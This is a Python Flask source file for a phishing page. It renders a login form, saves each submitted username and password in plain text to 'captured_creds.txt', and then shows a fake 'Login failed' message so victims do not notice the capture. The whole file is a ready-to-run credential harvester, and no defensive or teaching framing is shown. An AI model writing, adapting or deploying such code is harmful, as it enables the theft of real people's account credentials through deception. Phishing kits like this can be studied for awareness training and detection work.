from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Create captured_creds.txt if it doesn't exist
if not os.path.exists('captured_creds.txt'):
    open('captured_creds.txt', 'w').close()

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Save credentials to file
        with open('captured_creds.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        
        # Redirect to fake error page
        return redirect('/error')
    
    return render_template('login.html')

@app.route('/error')
def error():
    return "<h2>Login failed. Please try again later.</h2>"

if __name__ == '__main__':
    print("Template folder:", app.template_folder)
    print("Templates available:", os.listdir(app.template_folder))
    app.run(debug=True)
